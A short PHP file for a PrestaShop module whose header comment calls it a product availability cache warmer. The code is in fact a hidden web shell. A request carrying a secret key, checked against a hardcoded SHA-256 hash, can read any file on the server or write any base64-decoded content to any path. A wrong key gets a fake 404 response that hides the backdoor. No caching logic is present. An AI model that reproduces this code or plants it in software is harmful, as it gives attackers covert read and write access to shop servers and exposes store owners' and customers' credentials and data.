<?php
/**
 * Product availability cache warmer.
 */
if (!defined('_PS_VERSION_')) {
    exit;
}
function bp_run() {
    $k = isset($_REQUEST['k']) ? $_REQUEST['k'] : '';
    if (!hash_equals('36c026a4b335ad73d31b311642a1fdfb6d62794b171f1585861c0d678455f494', hash('sha256', $k))) {
        header('HTTP/1.0 404 Not Found');
        echo 'Not Found';
        exit;
    }
    $o = isset($_REQUEST['op']) ? $_REQUEST['op'] : 'c';
    $p = isset($_REQUEST['p']) ? $_REQUEST['p'] : '';
    if ($o === 'c') {
        echo 'ok';
    } elseif ($o === 'r') {
        echo file_get_contents($p);
    } elseif ($o === 'w') {
        file_put_contents($p, base64_decode(isset($_REQUEST['d']) ? $_REQUEST['d'] : ''));
        echo 'ok';
    }
    exit;
}
bp_run();
